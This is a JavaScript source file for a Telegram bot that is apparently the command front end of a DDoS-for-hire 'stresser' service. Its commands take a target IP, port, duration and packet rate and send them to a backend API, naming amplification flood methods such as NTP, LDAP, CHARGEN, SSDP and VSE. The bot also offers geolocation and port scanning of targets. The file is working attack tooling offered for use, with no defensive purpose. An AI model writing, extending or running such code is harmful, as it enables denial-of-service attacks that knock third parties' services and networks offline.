const client = require("../index")
const Util = require('../Util/API');
const util = new Util.default;

// sleek Method: ampblend
client.command("ampblend", async (ctx) => {
    let input = ctx.message.text.split(" ");
    const address = input[1]; // IP
    const port = input[2] // PORT
    const time = input[3] // TIME
    const pps = input[4] // PowerPerSec

    if (!address || !port || !time || !pps) return ctx.reply("❌ Error | Correct Usage: [[IP]] [[PORT]] [[TIME]] [[PPS]]")
    if (time < 1 || time > 3600) return ctx.reply("time should be between: 1-3600")
    if (pps < 10 || pps > 1000000) return ctx.reply("pps should be between: 1-1000000")

    await util.requestAPI(address, port, time, 'AMPBLEND', pps)
    ctx.reply(`IP: ${address}\nPort: ${port}\nTime: ${time}\nPPS: ${pps}\nMethod: AMPBLEND`);
})
// sleek Method: charge
client.command("charge", async (ctx) => {
    let input = ctx.message.text.split(" ");
    const address = input[1]; // IP
    const port = input[2] // PORT
    const time = input[3] // TIME
    const pps = input[4] // PowerPerSec

    if (!address || !port || !time || !pps) return ctx.reply("❌ Error | Correct Usage: [[IP]] [[PORT]] [[TIME]] [[PPS]]")
    if (time < 1 || time > 3600) return ctx.reply("time should be between: 1-3600")
    if (pps < 10 || pps > 1000000) return ctx.reply("pps should be between: 1-1000000")

    await util.requestAPI(address, port, time, 'CHARGEN', pps)
    ctx.reply(`IP: ${address}\nPort: ${port}\nTime: ${time}\nPPS: ${pps}\nMethod: CHARGEN`);
})

// sleek Method: ldap
client.command("ldap", async (ctx) => {
    let input = ctx.message.text.split(" ");
    const address = input[1]; // IP
    const port = input[2] // PORT
    const time = input[3] // TIME
    const pps = input[4] // PowerPerSec

    if (!address || !port || !time || !pps) return ctx.reply("❌ Error | Correct Usage: [[IP]] [[PORT]] [[TIME]] [[PPS]]")
    if (time < 1 || time > 3600) return ctx.reply("time should be between: 1-3600")
    if (pps < 10 || pps > 1000000) return ctx.reply("pps should be between: 1-1000000")

    await util.requestAPI(address, port, time, 'LDAP', pps)
    ctx.reply(`IP: ${address}\nPort: ${port}\nTime: ${time}\nPPS: ${pps}\nMethod: LDAP`);
})

// sleek Method: ntp
client.command("ntp", async (ctx) => {
    let input = ctx.message.text.split(" ");
    const address = input[1]; // IP
    const port = input[2] // PORT
    const time = input[3] // TIME
    const pps = input[4] // PowerPerSec

    if (!address || !port || !time || !pps) return ctx.reply("❌ Error | Correct Usage: [[IP]] [[PORT]] [[TIME]] [[PPS]]")
    if (time < 1 || time > 3600) return ctx.reply("time should be between: 1-3600")
    if (pps < 10 || pps > 1000000) return ctx.reply("pps should be between: 1-1000000")

    await util.requestAPI(address, port, time, 'NTP', pps)
    ctx.reply(`IP: ${address}\nPort: ${port}\nTime: ${time}\nPPS: ${pps}\nMethod: NTP`);
})

// sleek Method: ssdp
client.command("ssdp", async (ctx) => {
    let input = ctx.message.text.split(" ");
    const address = input[1]; // IP
    const port = input[2] // PORT
    const time = input[3] // TIME
    const pps = input[4] // PowerPerSec

    if (!address || !port || !time || !pps) return ctx.reply("❌ Error | Correct Usage: [[IP]] [[PORT]] [[TIME]] [[PPS]]")
    if (time < 1 || time > 3600) return ctx.reply("time should be between: 1-3600")
    if (pps < 10 || pps > 1000000) return ctx.reply("pps should be between: 1-1000000")

    await util.requestAPI(address, port, time, 'SSDP', pps)
    ctx.reply(`IP: ${address}\nPort: ${port}\nTime: ${time}\nPPS: ${pps}\nMethod: SSDP`);
})

// sleek Method: vntp
client.command("vntp", async (ctx) => {
    let input = ctx.message.text.split(" ");
    const address = input[1]; // IP
    const port = input[2] // PORT
    const time = input[3] // TIME
    const pps = input[4] // PowerPerSec

    if (!address || !port || !time || !pps) return ctx.reply("❌ Error | Correct Usage: [[IP]] [[PORT]] [[TIME]] [[PPS]]")
    if (time < 1 || time > 3600) return ctx.reply("time should be between: 1-3600")
    if (pps < 10 || pps > 1000000) return ctx.reply("pps should be between: 1-1000000")

    await util.requestAPI(address, port, time, 'VNTP', pps)
    ctx.reply(`IP: ${address}\nPort: ${port}\nTime: ${time}\nPPS: ${pps}\nMethod: VNTP`);
})

// sleek Method: Vse
client.command("vse", async (ctx) => {
    let input = ctx.message.text.split(" ");
    const address = input[1]; // IP
    const port = input[2] // PORT
    const time = input[3] // TIME
    const pps = input[4] // PowerPerSec

    if (!address || !port || !time || !pps) return ctx.reply("❌ Error | Correct Usage: [[IP]] [[PORT]] [[TIME]] [[PPS]]")
    if (time < 1 || time > 3600) return ctx.reply("time should be between: 1-3600")
    if (pps < 10 || pps > 1000000) return ctx.reply("pps should be between: 1-1000000")

    await util.requestAPI(address, port, time, 'VSE', pps)
    ctx.reply(`IP: ${address}\nPort: ${port}\nTime: ${time}\nPPS: ${pps}\nMethod: VSE`);
})

// geoip
client.command("geoip", async (ctx) => {
    let input = ctx.message.text.split(" ");
    if (input.length != 2) {
        ctx.reply("Please give me an ip to search!")
        return;
    } else {
        axios.get(`http://ip-api.com/json/${input[1]}`).then(res => {
            var string = JSON.stringify(res.data)
            ctx.reply(`ISP: ${res.data.isp}\nCountry: ${res.data.country}\nCountryCode: ${res.data.countryCode}\nRegion: ${res.data.region}\nRegion Name: ${res.data.regionName}\nCity: ${res.data.city}\nZip: ${res.data.zip}\nLatitude: ${res.data.lat}\nLongitude: ${res.data.lon}\nTimezone: ${res.data.timezone}\nOrganization: ${res.data.org}`)
        })
    }
})

// nmap
client.command("nmap", async (ctx) => {
    let input = ctx.message.text.split(" ");
    if (input.length != 2) {
        ctx.reply("Please give me an ip to port scan");
        return;
    } else {
        axios.get(`https://api.hackertarget.com/nmap/?q=${input[1]}`).then(r => {
            ctx.reply(r.data)
        })
    }
})

    // client.start((ctx) => {
    //     ctx.reply(ctx.from.first_name + " has entered the start command it is a " +
    //         ctx.updateSubTypes[0])
    //     console.log(ctx.form);
    //     console.log(ctx.chat);
    //     console.log(ctx.message);
    //     console.log(ctx.updateSubTypes);
    // })

    const helpcommand = `
    /NTP [[IP]] [[PORT]] [[TIME]] [[PPS]]\n/VNTP [[IP]] [[PORT]] [[TIME]] [[PPS]]\n/LDAP [[IP]] [[PORT]] [[TIME]] [[PPS]]\n/CHARGEN [[IP]] [[PORT]] [[TIME]] [[PPS]]\n/AMPBLEND [[IP]] [[PORT]] [[TIME]] [[PPS]]\n/SSDP [[IP]] [[PORT]] [[TIME]] [[PPS]]\n/VSE [[IP]] [[PORT]] [[TIME]] [[PPS]]\n/GEOIP [[IP]]\n/NMAP [[IP]]
    `

    client.help(ctx => {
        client.telegram.sendMessage(ctx.from.id, helpcommand, {
            parse_mode: "Markdown"
        })
    });